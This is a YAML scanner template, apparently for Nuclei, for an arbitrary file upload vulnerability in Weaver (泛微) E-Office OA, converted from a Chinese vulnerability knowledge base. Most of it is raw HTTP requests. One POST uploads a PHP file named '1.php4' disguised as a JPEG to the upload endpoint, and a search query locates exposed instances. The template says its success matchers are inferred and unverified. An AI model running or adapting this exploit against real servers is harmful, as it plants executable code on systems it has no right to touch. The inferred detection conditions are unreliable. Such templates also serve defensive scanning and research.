id: poc-5273df6e65b6ffafcb0e
info:
  name: 泛微E-Officefile-upload任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5273df6e65b6ffafcb0e698ba1720ed4

    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2025
  metadata:
    source: yuque-hacktwo-dtdx2v
    doc-slug: 5273df6e65b6ffafcb0e698ba1720ed4
    fofa: + hunter`app.name="泛微 e-office OA"`
http:
- raw:
  - 'GET /sample.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Content-Type: application/x-www-form-urlencoded

    Accept-Encoding: gzip'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'POST /inc/ext/upload/file-upload.php HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

    Accept-Encoding: gzip, deflate

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryc3kzQm4dBRhin8Dk

    Cookie: {cookie}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15


    ------WebKitFormBoundaryc3kzQm4dBRhin8Dk

    Content-Disposition: form-data; name="userfile"; filename="1.php4"

    Content-Type: image/jpeg


    <?php phpinfo();?>

    ------WebKitFormBoundaryc3kzQm4dBRhin8Dk--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /general/address/view/get-images.php?alb_id=11&start=0&limit=1 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    Content-Type: application/x-www-form-urlencoded

    Cookie: {cookie}

    Accept-Encoding: gzip'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
